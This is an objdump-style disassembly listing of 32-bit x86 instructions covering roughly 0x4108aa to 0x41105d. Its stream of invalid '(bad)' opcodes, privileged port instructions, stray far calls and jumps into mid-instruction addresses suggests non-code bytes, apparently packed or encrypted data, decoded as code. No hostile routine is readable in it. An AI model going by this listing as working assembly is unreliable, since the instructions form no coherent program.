  4108aa:	mov    eax,ds:0x92938096
  4108af:	jnp    0x41089c
  4108b1:	test   al,0x2e
  4108b3:	scas   al,BYTE PTR es:[edi]
  4108b4:	sar    edi,cl
  4108b6:	repz js 0x410850
  4108b9:	pop    es
  4108ba:	dec    edx
  4108bb:	and    BYTE PTR [ebp+0x13087d44],ch
  4108c1:	or     DWORD PTR [ebx-0x71],esp
  4108c4:	push   edi
  4108c5:	stos   DWORD PTR es:[edi],eax
  4108c6:	ret    0xbe8f
  4108c9:	das    
  4108ca:	adc    DWORD PTR [eax-0x22],ebx
  4108cd:	sub    BYTE PTR [ebp+eax*4+0x5f],dh
  4108d1:	jae    0x410927
  4108d3:	sbb    BYTE PTR [ebp+0x5ae2ce2b],al
  4108d9:	cs pop eax
  4108db:	aaa    
  4108dc:	nop
  4108dd:	call   0x1b8f:0xfcd8c40a
  4108e4:	inc    ecx
  4108e5:	and    al,0xf1
  4108e7:	sbb    eax,0x9f0892ec
  4108ec:	adc    eax,0xb5200d79
  4108f1:	ja     0x4108a4
  4108f3:	fnsave [ecx+0x6e]
  4108f6:	cmp    edx,0xb51d42e4
  4108fc:	popf   
  4108fd:	jb     0x4108eb
  4108ff:	arpl   bp,dx
  410901:	icebp  
  410902:	xchg   ebp,eax
  410903:	fwait
  410904:	retf   
  410905:	fs retf 0xa4f7
  410909:	not    ecx
  41090b:	stc    
  41090c:	jb     0x410945
  41090e:	dec    edi
  41090f:	icebp  
  410910:	(bad)  
  410912:	mov    bh,0x89
  410914:	mov    al,ds:0x563ded03
  410919:	in     al,0xdb
  41091b:	call   0x611f:0x9f274a97
  410922:	or     ecx,DWORD PTR [ebx-0x1e5d76d3]
  410928:	mov    edi,0x2b26c9b6
  41092d:	and    esp,DWORD PTR [edi]
  41092f:	jno    0x4108ff
  410931:	je     0x41097e
  410933:	jge    0x4109aa
  410935:	daa    
  410936:	dec    edi
  410937:	or     DWORD PTR [edx],edi
  410939:	push   ss
  41093a:	icebp  
  41093b:	sub    al,0xc5
  41093d:	fs pop eax
  41093f:	cld    
  410940:	sub    DWORD PTR [esi-0x6e6479c],0xfbaab7d6
  41094a:	adc    al,BYTE PTR [ebp-0x3e]
  41094d:	mov    WORD PTR [eax-0x4e2b1e01],?
  410953:	mov    al,0xb2
  410955:	aas    
  410956:	dec    eax
  410957:	pop    ecx
  410958:	retf   
  410959:	imul   edx,DWORD PTR [ecx+ecx*4],0xf83f8122
  410960:	push   ecx
  410961:	es pop esp
  410963:	ins    BYTE PTR es:[edi],dx
  410964:	mov    ds:0xc1faa0cc,al
  410969:	xor    edi,eax
  41096b:	lods   eax,DWORD PTR ds:[esi]
  41096c:	ja     0x4109b0
  41096e:	rcr    eax,cl
  410970:	mov    edx,0x7ffdf8dd
  410975:	jbe    0x410972
  410977:	cmp    dl,ch
  410979:	or     bl,BYTE PTR [ecx+edx*4-0x3bd8942c]
  410980:	test   eax,0xe0e5ffa4
  410985:	push   0x11
  410987:	pop    ds
  410988:	jmp    DWORD PTR [edi+0x1f]
  41098b:	and    BYTE PTR [ebp+0x70],bh
  41098e:	hlt    
  41098f:	leave  
  410990:	lea    edi,[ebx]
  410992:	ins    DWORD PTR es:[edi],dx
  410993:	and    cl,BYTE PTR [edi+0x3e137a89]
  410999:	adc    bh,cl
  41099b:	pop    eax
  41099c:	xor    eax,0xa7f5c78a
  4109a1:	lds    edi,FWORD PTR [edi-0xe]
  4109a4:	pop    ebx
  4109a5:	dec    ebx
  4109a6:	dec    ebp
  4109a7:	std    
  4109a8:	not    BYTE PTR [esp+edi*2]
  4109ab:	ins    BYTE PTR es:[edi],dx
  4109ac:	mov    al,ds:0x425a03d8
  4109b1:	mov    eax,0x228fa7ee
  4109b6:	shr    BYTE PTR [edx+edx*1],0x65
  4109ba:	in     al,0x3
  4109bc:	push   edx
  4109be:	loop   0x410976
  4109c0:	xor    ch,BYTE PTR [edi]
  4109c2:	xchg   edx,eax
  4109c3:	neg    BYTE PTR [ebp-0x74]
  4109c6:	jmp    0xccf3feb5
  4109cb:	sbb    eax,0xb9f06bab
  4109d0:	outs   dx,BYTE PTR ds:[esi]
  4109d1:	aaa    
  4109d2:	repz mov ch,BYTE PTR [edx]
  4109d5:	les    eax,FWORD PTR [ebp+eax*4+0x22]
  4109d9:	in     eax,0xb
  4109db:	fwait
  4109dc:	pop    esp
  4109dd:	scas   al,BYTE PTR es:[edi]
  4109de:	push   cs
  4109df:	mov    esp,eax
  4109e1:	cmp    eax,0x325970f9
  4109e6:	jbe    0x410a5b
  4109e8:	(bad)  [edi]
  4109ea:	mov    al,0x25
  4109ec:	(bad)  
  4109ee:	mov    esi,0xdbf21d81
  4109f3:	xchg   ebx,eax
  4109f4:	xchg   ebx,eax
  4109f5:	in     al,0xf
  4109f7:	lahf   
  4109f8:	add    BYTE PTR [edx-0x3e],bh
  4109fb:	(bad)  [edi]
  4109fd:	jo     0x410a3d
  4109ff:	call   ebp
  410a01:	cmp    ebx,ebx
  410a03:	fdivr  QWORD PTR [ecx+ebx*1-0x5eaf8adb]
  410a0a:	sahf   
  410a0b:	pop    esi
  410a0c:	clc    
  410a0d:	add    al,0xdf
  410a0f:	scas   al,BYTE PTR es:[edi]
  410a10:	sbb    eax,0xf34d2451
  410a15:	xor    ebp,edi
  410a17:	jmp    0x4109f3
  410a19:	xor    esp,ebx
  410a1b:	fdivp  st(4),st
  410a1d:	into   
  410a1e:	repz dec eax
  410a20:	pop    edi
  410a21:	jmp    0x410a8d
  410a23:	inc    edx
  410a24:	or     bh,cl
  410a26:	cmp    eax,DWORD PTR [eax-0x5637d4f8]
  410a2c:	xchg   ecx,eax
  410a2d:	jne    0x4109d7
  410a2f:	add    DWORD PTR [eax],ebx
  410a31:	sti    
  410a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a33:	ins    DWORD PTR es:[edi],dx
  410a34:	out    dx,al
  410a35:	jmp    FWORD PTR [edi+0x78]
  410a38:	outs   dx,BYTE PTR ds:[esi]
  410a39:	or     ax,0xc31d
  410a3d:	jnp    0x4109e8
  410a3f:	cld    
  410a40:	adc    DWORD PTR ds:0x9535d02b,0xee43fb39
  410a4a:	aam    0x7f
  410a4c:	mov    al,ds:0xb2df7da
  410a51:	mov    ch,0x56
  410a53:	fld    TBYTE PTR [esi*8-0x4285b6ff]
  410a5a:	mov    esp,0xcc388087
  410a5f:	pushf  
  410a60:	(bad)  
  410a61:	jb     0x410a14
  410a63:	dec    ebx
  410a64:	fwait
  410a65:	push   esi
  410a66:	in     eax,0xbb
  410a68:	pop    esi
  410a69:	nop
  410a6a:	ret    
  410a6b:	mov    bl,0x52
  410a6d:	mov    bh,0xef
  410a6f:	add    al,0x5b
  410a71:	push   ebp
  410a72:	pop    eax
  410a73:	loop   0x410a82
  410a75:	inc    ecx
  410a76:	mov    dh,0x2d
  410a78:	adc    eax,0xf08bfee1
  410a7d:	cmova  eax,DWORD PTR [ebp+0x5f]
  410a81:	push   ds
  410a82:	sbb    bl,BYTE PTR [edx+0x7c42d2c3]
  410a88:	or     edi,DWORD PTR [eax+ecx*1+0x7a]
  410a8c:	dec    eax
  410a8d:	pop    es
  410a8e:	das    
  410a8f:	mov    edx,0x707cec04
  410a94:	jg     0x410a7a
  410a96:	leave  
  410a97:	dec    edi
  410a98:	or     edi,0x260aa36b
  410a9e:	call   0x215b:0x3ea1d01f
  410aa5:	jl     0x410adb
  410aa7:	inc    ecx
  410aa8:	scas   al,BYTE PTR es:[edi]
  410aa9:	xor    DWORD PTR [ebx],0xffffffb0
  410aac:	pop    edx
  410aad:	test   ch,bh
  410aaf:	jge    0x410a4a
  410ab1:	pop    ebp
  410ab2:	sub    eax,0x36d99867
  410ab7:	call   0xe609:0xf6db6e56
  410abe:	icebp  
  410abf:	mov    ch,0xfd
  410ac1:	push   edx
  410ac2:	cmp    ecx,eax
  410ac4:	push   cs
  410ac5:	mov    eax,ds:0xf23331a6
  410aca:	mov    bl,0x99
  410acc:	arpl   bx,di
  410ace:	mov    eax,ds:0xd19384fd
  410ad3:	jmp    0x410aca
  410ad5:	test   ah,0xb5
  410ad8:	retf   
  410ad9:	lods   eax,DWORD PTR ds:[esi]
  410ada:	pop    es
  410adb:	xchg   edx,eax
  410adc:	pusha  
  410add:	daa    
  410ade:	mov    bh,0x42
  410ae0:	pusha  
  410ae1:	push   ebp
  410ae2:	jno    0x410aba
  410ae4:	out    dx,al
  410ae5:	shr    DWORD PTR [eax-0x43f26043],0xec
  410aec:	pushf  
  410aed:	inc    ebx
  410aee:	mov    dl,0x5a
  410af0:	out    dx,al
  410af1:	in     eax,dx
  410af2:	or     al,0x10
  410af4:	scas   eax,DWORD PTR es:[edi]
  410af5:	rol    esi,cl
  410af7:	shr    DWORD PTR [eax+0x32],0x1
  410afb:	or     dl,BYTE PTR [edx+eax*4-0x21]
  410aff:	test   al,0xa1
  410b01:	jp     0x410aa7
  410b03:	jge    0x410b56
  410b05:	push   ebx
  410b06:	popa   
  410b07:	les    edx,FWORD PTR [esi-0x43]
  410b0a:	lea    esp,[eax-0x5d]
  410b0d:	fwait
  410b0e:	shr    BYTE PTR [esi],1
  410b10:	inc    ebx
  410b11:	imul   eax,DWORD PTR [ecx],0x44df12f2
  410b17:	sahf   
  410b18:	push   0xe47bc809
  410b1d:	mov    ch,0xd8
  410b1f:	in     al,dx
  410b20:	jns    0x410af3
  410b22:	or     BYTE PTR [edx+0x61],dh
  410b25:	(bad)  
  410b26:	icebp  
  410b27:	jg     0x410b0f
  410b29:	arpl   WORD PTR [eax],bx
  410b2b:	iret   
  410b2c:	adc    al,0x90
  410b2e:	sub    dl,BYTE PTR [ecx]
  410b30:	gs stos DWORD PTR es:[edi],eax
  410b32:	imul   ecx,DWORD PTR [ebp-0x24311b90],0xa62377ce
  410b3c:	sub    dh,BYTE PTR [esi+0x56ff71c6]
  410b42:	or     al,0xe3
  410b44:	xchg   ah,ch
  410b46:	stos   BYTE PTR es:[edi],al
  410b47:	mov    WORD PTR [edi+0x3f],?
  410b4a:	daa    
  410b4b:	pop    esp
  410b4c:	(bad)
  410b50:	js     0x410bce
  410b52:	add    eax,0xcda97664
  410b57:	push   esi
  410b58:	cmp    dh,BYTE PTR [edi*1-0x71e14175]
  410b5f:	aam    0xd9
  410b61:	lods   al,BYTE PTR ds:[esi]
  410b62:	and    BYTE PTR [ebx],dh
  410b64:	mov    esp,0xbb8ebb1d
  410b69:	leave  
  410b6a:	mov    DWORD PTR [edi-0x49ed3ef5],esp
  410b70:	in     eax,dx
  410b71:	pusha  
  410b72:	in     eax,dx
  410b73:	xor    edx,DWORD PTR [ecx-0x23]
  410b76:	call   0x355d4170
  410b7b:	inc    ecx
  410b7c:	sar    DWORD PTR [edx-0x61],cl
  410b7f:	sti    
  410b80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b81:	pop    ds
  410b82:	test   al,0x53
  410b84:	lahf   
  410b85:	jo     0x410bc9
  410b87:	pop    edx
  410b88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b89:	or     ebx,DWORD PTR [edi-0x4b]
  410b8c:	jo     0x410b3a
  410b8e:	in     al,dx
  410b8f:	retf   
  410b90:	dec    ebp
  410b91:	out    dx,eax
  410b92:	adc    eax,DWORD PTR [edx-0xf]
  410b95:	push   eax
  410b96:	mov    ebx,0xde419472
  410b9b:	pop    ebp
  410b9c:	aaa    
  410b9d:	neg    DWORD PTR [edi+0x5f35ccf]
  410ba3:	cmc    
  410ba4:	aad    0x9
  410ba6:	jp     0x410b34
  410ba8:	inc    edi
  410ba9:	ss pop es
  410bab:	xchg   esi,eax
  410bac:	out    dx,al
  410bad:	shr    BYTE PTR [edx+0x76],0x67
  410bb1:	xor    al,0xc7
  410bb3:	mov    bh,0x9d
  410bb5:	mov    BYTE PTR [edx],0x5f
  410bb8:	pop    ss
  410bb9:	and    ah,BYTE PTR [esi]
  410bbb:	fsubr  DWORD PTR [esp+eax*4-0x6]
  410bbf:	push   esp
  410bc0:	xor    BYTE PTR ds:0x3ca8ed41,dh
  410bc6:	inc    ebx
  410bc7:	mov    ah,0x71
  410bc9:	push   cs
  410bca:	mov    fs,WORD PTR [ebp-0x139b65e7]
  410bd0:	mov    BYTE PTR [eax+0x30f4335],dl
  410bd6:	dec    ebp
  410bd7:	popf   
  410bd8:	dec    edi
  410bd9:	sbb    edi,esp
  410bdb:	pop    edi
  410bdc:	cld    
  410bdd:	xchg   esp,eax
  410bde:	stos   DWORD PTR es:[edi],eax
  410bdf:	div    DWORD PTR [eax+eiz*2+0x21]
  410be3:	scas   eax,DWORD PTR es:[edi]
  410be4:	ds push bp
  410be7:	das    
  410be8:	mov    bh,0x95
  410bea:	ds into 
  410bec:	in     al,dx
  410bed:	int3   
  410bee:	inc    esp
  410bef:	outs   dx,BYTE PTR ds:[esi]
  410bf0:	mov    bh,BYTE PTR [esi-0x678f56b5]
  410bf6:	repnz test WORD PTR [ebx],bp
  410bfa:	es sar ebx,1
  410bfd:	scas   eax,DWORD PTR es:[edi]
  410bfe:	mov    edx,0xfe16ea7
  410c03:	(bad)
  410c07:	and    eax,0xbef8c2ab
  410c0c:	cli    
  410c0d:	pop    ss
  410c0e:	and    al,BYTE PTR [eax+ebx*2+0x43]
  410c12:	or     ebp,DWORD PTR [eax]
  410c14:	push   cs
  410c15:	xchg   BYTE PTR [edx],cl
  410c17:	add    esi,DWORD PTR [esi-0x70]
  410c1a:	jo     0x410be3
  410c1c:	xchg   ebx,eax
  410c1d:	in     eax,dx
  410c1e:	shl    bl,0xc
  410c21:	ja     0x410bde
  410c23:	and    eax,0xf1dcc61a
  410c28:	xor    al,0x99
  410c2a:	jle    0x410c87
  410c2c:	iret   
  410c2d:	adc    eax,0x8f83776
  410c32:	fwait
  410c33:	inc    edx
  410c34:	and    ebp,ebx
  410c36:	mov    esi,0x24f686
  410c3b:	or     al,BYTE PTR [ecx-0xd8b2813]
  410c41:	mov    al,0x5c
  410c43:	push   cs
  410c44:	cli    
  410c45:	test   al,0x98
  410c47:	fcomp  st(2)
  410c49:	es cmp ebp,edx
  410c4c:	fistp  DWORD PTR [eiz*2-0x3a5a9777]
  410c53:	in     eax,dx
  410c54:	ret    0xbadb
  410c57:	scas   al,BYTE PTR es:[edi]
  410c58:	(bad)  
  410c59:	cdq    
  410c5a:	mov    ch,0x12
  410c5c:	inc    eax
  410c5d:	pop    eax
  410c5e:	xchg   esp,eax
  410c5f:	adc    esp,DWORD PTR [ecx]
  410c61:	mov    edi,DWORD PTR [edi+ebp*8+0x54]
  410c65:	sub    BYTE PTR [ecx+ecx*4-0x153a248c],bl
  410c6c:	aaa    
  410c6d:	and    al,0x6f
  410c6f:	mov    edx,0x37308223
  410c74:	jmp    0x1072:0x5499e657
  410c7b:	into   
  410c7c:	std    
  410c7d:	adc    eax,0x8a8e6bbd
  410c82:	cmp    BYTE PTR cs:[ecx-0x14528238],0xae
  410c8a:	pushf  
  410c8b:	mov    esp,DWORD PTR [ebp-0x4f305201]
  410c91:	aad    0x6f
  410c93:	outs   dx,DWORD PTR ds:[esi]
  410c94:	dec    ecx
  410c95:	xchg   DWORD PTR [edi+0x10df80b2],edi
  410c9b:	arpl   WORD PTR [esi-0x53],bp
  410c9e:	mov    dh,0x6f
  410ca0:	add    BYTE PTR [ebx-0x7],dh
  410ca3:	add    ebp,DWORD PTR [ecx]
  410ca5:	xor    eax,esi
  410ca7:	xchg   BYTE PTR [edx-0x58],dh
  410caa:	(bad)  
  410cab:	outs   dx,DWORD PTR ds:[esi]
  410cac:	enter  0xfb36,0x3e
  410cb0:	outs   dx,DWORD PTR ds:[esi]
  410cb1:	aam    0x46
  410cb3:	mov    ah,0x23
  410cb5:	jne    0x410c79
  410cb7:	fdiv   QWORD PTR [ebp-0xf2c2277]
  410cbd:	jno    0x410d38
  410cbf:	pop    edi
  410cc0:	das    
  410cc1:	and    eax,DWORD PTR [edx-0x22a65d49]
  410cc7:	ror    DWORD PTR [ecx],0x7b
  410cca:	int3   
  410ccb:	outs   dx,DWORD PTR ds:[esi]
  410ccc:	cmc    
  410ccd:	mov    al,ds:0x10e4b19a
  410cd2:	shl    BYTE PTR [ebx],0xd1
  410cd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cd6:	jb     0x410d3a
  410cd8:	(bad)  
  410cd9:	hlt    
  410cda:	popa   
  410cdb:	mov    ebp,es
  410cdd:	dec    ebx
  410cde:	sahf   
  410cdf:	lods   al,BYTE PTR cs:[esi]
  410ce1:	push   ebp
  410ce2:	jecxz  0x410d2a
  410ce4:	cli    
  410ce5:	pop    ebx
  410ce6:	scas   eax,DWORD PTR es:[edi]
  410ce7:	xor    eax,0xdd343df9
  410cec:	fimul  WORD PTR [esi+0x59]
  410cef:	cmp    eax,0x94fba9c6
  410cf4:	mov    eax,0x98ed330f
  410cf9:	fdiv   st(7),st
  410cfb:	in     al,0x6f
  410cfd:	adc    ch,BYTE PTR [edi-0x7c19228c]
  410d03:	xor    dh,BYTE PTR [edx-0x2d]
  410d06:	ss xchg edi,eax
  410d08:	dec    ebx
  410d09:	dec    ebx
  410d0a:	jle    0x410cec
  410d0c:	xchg   ecx,eax
  410d0d:	add    BYTE PTR [ecx+esi*2],ah
  410d10:	sbb    cl,BYTE PTR [ecx]
  410d12:	mov    ds:0x43424e27,eax
  410d17:	xchg   ebp,eax
  410d18:	xchg   edi,eax
  410d19:	cwde   
  410d1a:	add    esi,0xfc09aae1
  410d20:	mov    dh,0x58
  410d22:	inc    ecx
  410d23:	jecxz  0x410d48
  410d25:	xor    BYTE PTR [ebx+0x2f9af6ee],al
  410d2b:	std    
  410d2c:	mov    eax,?
  410d2e:	jmp    0x131797b6
  410d33:	mov    BYTE PTR [ecx-0xcd9863f],ah
  410d39:	jne    0x410d7e
  410d3b:	das    
  410d3c:	mov    eax,ds:0xdbb46df1
  410d41:	arpl   WORD PTR ds:0x95b96fa6,dx
  410d47:	jns    0x410d7c
  410d49:	dec    edi
  410d4a:	sbb    BYTE PTR [ebp+eax*2+0x71],cl
  410d4e:	(bad)  
  410d4f:	mov    edi,0x230b3a59
  410d54:	mov    eax,ds:0x66892ec1
  410d59:	mov    esp,0x5a7aae4b
  410d5e:	or     bl,dl
  410d60:	or     ebp,DWORD PTR [edi+0x33c4b866]
  410d66:	mov    edx,DWORD PTR [ebx-0x37]
  410d69:	xchg   ebp,eax
  410d6a:	sti    
  410d6b:	cmp    al,0xe5
  410d6d:	inc    eax
  410d6e:	xchg   DWORD PTR [ebp+0x442b0871],ebp
  410d74:	mov    eax,0xd2a6b40c
  410d79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d7a:	fwait
  410d7b:	sbb    BYTE PTR ds:0x586f9715,bl
  410d81:	bound  edx,QWORD PTR ds:0xa2340352
  410d87:	dec    ebx
  410d88:	cwde   
  410d89:	ins    BYTE PTR es:[edi],dx
  410d8a:	jecxz  0x410d88
  410d8c:	(bad)  
  410d8d:	shl    BYTE PTR [esi+0x1a],cl
  410d90:	bnd call 0x9fecef43
  410d96:	xor    BYTE PTR [edi+ebp*4+0xb],bl
  410d9a:	pop    edi
  410d9b:	out    0x43,al
  410d9d:	pusha  
  410d9e:	retf   0xe876
  410da1:	dec    edx
  410da2:	mov    ecx,0xe9746006
  410da7:	adc    DWORD PTR [eax-0x494cfb4c],edx
  410dad:	jp     0x410e20
  410daf:	inc    ebp
  410db0:	cld    
  410db1:	arpl   si,di
  410db3:	stos   DWORD PTR es:[edi],eax
  410db4:	push   ds
  410db5:	in     eax,dx
  410db6:	dec    esp
  410db7:	and    DWORD PTR [ebp+0x78171903],0x1
  410dbe:	adc    al,0xd
  410dc0:	push   ebx
  410dc1:	pop    ebp
  410dc2:	lods   al,BYTE PTR ds:[esi]
  410dc3:	jo     0x410e2f
  410dc5:	mov    edx,0xd6f0d1fe
  410dca:	pop    edi
  410dcb:	repz data16 aas 
  410dce:	sbb    DWORD PTR [ebp-0x4b0bee9a],ecx
  410dd4:	xchg   esp,eax
  410dd5:	lock popa 
  410dd7:	jo     0x410d8e
  410dd9:	xor    DWORD PTR [edx+0x5d],esp
  410ddc:	retf   
  410ddd:	rcl    BYTE PTR [edi],cl
  410ddf:	test   al,0x26
  410de1:	mov    esp,0x42060606
  410de6:	jmp    0x410d94
  410de8:	inc    DWORD PTR cs:[edi-0x20]
  410dec:	push   0xffffffb9
  410dee:	(bad)  
  410def:	jle    0x410e09
  410df1:	mov    edx,0x73b99edf
  410df6:	fldenv [esi-0xc]
  410df9:	xchg   ecx,eax
  410dfa:	clc    
  410dfb:	adc    ebx,DWORD PTR [edx]
  410dfd:	pop    ds
  410dfe:	dec    esp
  410dff:	mov    BYTE PTR [ebp+ebx*1+0x42],al
  410e03:	clc    
  410e04:	imul   esp,DWORD PTR [edi-0x6ba2afd1],0x5f
  410e0b:	and    dh,BYTE PTR [ebx-0x53]
  410e0e:	popa   
  410e0f:	mov    ch,bh
  410e11:	rcl    BYTE PTR [ebx-0x64e5f242],cl
  410e17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e18:	mov    ah,0x57
  410e1a:	lahf   
  410e1b:	add    DWORD PTR [eax+ecx*1+0x3cd6a4f7],0xfffffff1
  410e23:	xchg   BYTE PTR [ebx+0x5b62b54b],dl
  410e29:	repnz sbb DWORD PTR [ecx+0x15],ecx
  410e2d:	out    0x4e,eax
  410e2f:	in     al,0x78
  410e31:	pop    es
  410e32:	gs fwait
  410e34:	out    0x9d,eax
  410e36:	stc    
  410e37:	mov    bh,0x14
  410e39:	xchg   esp,eax
  410e3a:	lea    eax,[esi+0xa]
  410e3d:	xchg   ebp,eax
  410e3e:	push   esp
  410e3f:	stos   BYTE PTR es:[edi],al
  410e40:	adc    edx,DWORD PTR [ecx-0x1b]
  410e43:	outs   dx,DWORD PTR ds:[esi]
  410e44:	ret    
  410e45:	stos   DWORD PTR es:[edi],eax
  410e46:	mov    eax,0xd64d5c06
  410e4b:	call   0xbf0e:0x1180bdf9
  410e52:	popa   
  410e53:	std    
  410e54:	push   es
  410e55:	ss mov ch,0x82
  410e58:	sahf   
  410e59:	jb     0x410e4a
  410e5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e5c:	xchg   BYTE PTR [edx],dh
  410e5e:	sub    ah,BYTE PTR [edi-0x5cd420ca]
  410e64:	sbb    DWORD PTR [eax],edi
  410e66:	sub    ch,BYTE PTR [ebp+0x7640a891]
  410e6c:	retf   
  410e6d:	push   edi
  410e6e:	jo     0x410e48
  410e70:	sahf   
  410e71:	jo     0x410e08
  410e73:	scas   eax,DWORD PTR es:[edi]
  410e74:	pushf  
  410e75:	leave  
  410e76:	retf   
  410e77:	repnz adc esp,ebx
  410e7a:	(bad)  [ebp-0x5e337e8c]
  410e80:	(bad)  
  410e81:	cdq    
  410e82:	popa   
  410e83:	sub    ebx,ecx
  410e85:	imul   eax,DWORD PTR [ecx-0x6a],0xde32f558
  410e8c:	fnsave [edi]
  410e8e:	jmp    0x410ea2
  410e90:	push   cs
  410e91:	div    BYTE PTR [edi+0x77]
  410e94:	(bad)  
  410e95:	xchg   esi,eax
  410e96:	adc    esp,DWORD PTR [ebx+0xe]
  410e99:	adc    al,0x5a
  410e9b:	cld    
  410e9c:	or     eax,0x2bcf596
  410ea1:	push   ds
  410ea2:	stc    
  410ea3:	popf   
  410ea4:	fisub  WORD PTR ds:0x230b4d08
  410eaa:	adc    cl,BYTE PTR [esi+0x10]
  410ead:	sub    al,0xaa
  410eaf:	xchg   edx,eax
  410eb0:	sbb    ebx,DWORD PTR [ebx]
  410eb2:	fwait
  410eb3:	dec    esp
  410eb4:	mov    al,BYTE PTR [edx-0x13]
  410eb7:	push   ecx
  410eb8:	loope  0x410f27
  410eba:	shl    BYTE PTR [eax+0x10],1
  410ebd:	pop    esp
  410ebe:	fnstsw WORD PTR [edi+0x42b08f43]
  410ec4:	ins    BYTE PTR es:[edi],dx
  410ec5:	xchg   ebp,eax
  410ec6:	pop    ds
  410ec7:	and    al,0x0
  410ec9:	arpl   WORD PTR ds:0x317322c2,si
  410ecf:	or     eax,0x42e3829f
  410ed4:	sbb    ecx,DWORD PTR [eax-0x3e]
  410ed7:	call   0x4a00:0xf2833a7a
  410ede:	mov    ebp,0xfe315e07
  410ee3:	xchg   esp,eax
  410ee4:	mov    esp,DWORD PTR [esi]
  410ee6:	fwait
  410ee7:	cmp    al,BYTE PTR [edx+0x49bb9de9]
  410eed:	cld    
  410eee:	test   eax,0x90dd384a
  410ef3:	addr16 push 0x1e
  410ef6:	popf   
  410ef7:	loope  0x410f1a
  410ef9:	or     edi,DWORD PTR [edx+0x39]
  410efc:	push   edi
  410efd:	(bad)  
  410efe:	in     eax,dx
  410eff:	and    al,0x5e
  410f01:	pop    ds
  410f02:	leave  
  410f03:	outs   dx,DWORD PTR ds:[esi]
  410f04:	(bad)  
  410f05:	mov    ebx,0x1572aade
  410f0a:	sub    eax,0x63e60544
  410f0f:	or     eax,0xbd9e7083
  410f14:	test   DWORD PTR [edx],eax
  410f16:	cdq    
  410f17:	mov    ch,0x3e
  410f19:	mov    ah,0xce
  410f1b:	cmp    eax,0xa74a56b
  410f20:	(bad)  
  410f21:	leave  
  410f22:	mov    ch,0x3c
  410f24:	ja     0x410f80
  410f26:	cmp    ah,cl
  410f28:	inc    ebp
  410f29:	inc    edx
  410f2a:	hlt    
  410f2b:	xchg   ecx,eax
  410f2c:	ins    BYTE PTR es:[edi],dx
  410f2d:	adc    al,0xa1
  410f2f:	cs mov ebx,ss
  410f32:	jecxz  0x410f93
  410f34:	clc    
  410f35:	and    ah,BYTE PTR ds:[eax]
  410f38:	js     0x410f38
  410f3a:	leave  
  410f3b:	jg     0x410eff
  410f3d:	mov    edx,0x8477f881
  410f42:	xchg   BYTE PTR [ecx],ch
  410f44:	or     ch,bh
  410f46:	and    eax,0x2e91b78e
  410f4b:	add    bh,BYTE PTR [edi+0x77d7e0c8]
  410f51:	xchg   esi,eax
  410f52:	stc    
  410f53:	sub    dl,BYTE PTR [edi-0x76c5e160]
  410f59:	pop    esp
  410f5a:	push   ebp
  410f5b:	push   DWORD PTR [edx]
  410f5d:	mov    bl,BYTE PTR [esi-0x3084c44e]
  410f63:	pushf  
  410f64:	or     eax,0x50164157
  410f69:	inc    edx
  410f6a:	cwde   
  410f6b:	dec    ecx
  410f6c:	int3   
  410f6d:	ficom  DWORD PTR [edi]
  410f6f:	sar    BYTE PTR [ebx+edx*8-0x3173e9e2],0xb8
  410f77:	outs   dx,BYTE PTR ds:[esi]
  410f78:	pusha  
  410f79:	pop    esi
  410f7a:	sbb    al,0x0
  410f7c:	js     0x410feb
  410f7e:	add    eax,0x6b1f395d
  410f83:	mov    al,ah
  410f85:	sbb    eax,0x51655a42
  410f8a:	(bad)  
  410f8b:	loop   0x410f22
  410f8d:	fidivr WORD PTR [ecx+esi*4+0x472bbee2]
  410f94:	in     eax,0x3f
  410f96:	inc    edx
  410f97:	fadd   DWORD PTR [eax]
  410f99:	vmwrite ecx,eax
  410f9c:	add    BYTE PTR [esi-0x628ff16e],al
  410fa2:	push   cs
  410fa3:	and    BYTE PTR [ecx+0x2e63b176],0xbd
  410faa:	lods   eax,DWORD PTR ds:[esi]
  410fab:	data16 sahf 
  410fad:	cmp    al,0x3d
  410faf:	jb     0x410fd9
  410fb1:	sbb    eax,DWORD PTR [ebx-0x420826ce]
  410fb7:	cmp    al,0xb6
  410fb9:	xor    eax,0x5cec045f
  410fbe:	fsubrp st(4),st
  410fc0:	ret    0x23e6
  410fc3:	add    DWORD PTR [edx-0x313596],ecx
  410fc9:	(bad)  
  410fca:	repnz (bad) 
  410fcc:	dec    ecx
  410fcd:	or     dh,BYTE PTR [esi+0x15b3f940]
  410fd3:	lds    ebp,FWORD PTR [eax+0x5a861e9]
  410fd9:	or     ecx,DWORD PTR [esi+0x55]
  410fdc:	es add bh,al
  410fdf:	arpl   WORD PTR [esi+0x1585de26],di
  410fe5:	femms  
  410fe7:	adc    al,0xb1
  410fe9:	push   esp
  410fea:	test   eax,0x8fadfe89
  410fef:	add    al,0x42
  410ff1:	xor    ebx,ecx
  410ff3:	in     al,dx
  410ff4:	les    eax,FWORD PTR [ecx+edx*8]
  410ff7:	xchg   BYTE PTR [esi-0x41343142],al
  410ffd:	jb     0x410fc1
  410fff:	rcl    DWORD PTR [ecx+eax*8],0xc4
  411003:	or     BYTE PTR [eax+0x28ad62d3],dh
  411009:	mov    DWORD PTR [eax],ecx
  41100b:	add    bl,BYTE PTR [ebx+0x7]
  41100e:	mov    edx,0x4598ad95
  411013:	pop    ds
  411014:	inc    esi
  411015:	adc    al,BYTE PTR [ebx-0x245cae49]
  41101b:	push   ds
  41101c:	jae    0x411014
  41101e:	jmp    0x41101c
  411020:	retf   0x22de
  411023:	add    ebx,DWORD PTR [edx+0x44]
  411026:	and    BYTE PTR [ebp-0x46],dl
  411029:	loope  0x41104d
  41102b:	dec    edx
  41102c:	in     al,dx
  41102d:	cs xor esp,esi
  411030:	and    al,0x78
  411032:	test   BYTE PTR [edx+0xda6e897],ch
  411038:	jbe    0x41101c
  41103a:	sub    DWORD PTR [esi+0x52f5c2c1],edx
  411040:	pusha  
  411041:	mov    ebp,DWORD PTR ds:0xd5d07633
  411047:	push   edx
  411048:	in     al,0x30
  41104a:	and    esp,esi
  41104c:	fadd   QWORD PTR [eax+0xb8243bc]
  411052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411053:	pop    ds
  411054:	loopne 0x411038
  411056:	xchg   ecx,eax
  411057:	and    esi,DWORD PTR ds:0x45d36de
  41105d:	out    dx,al
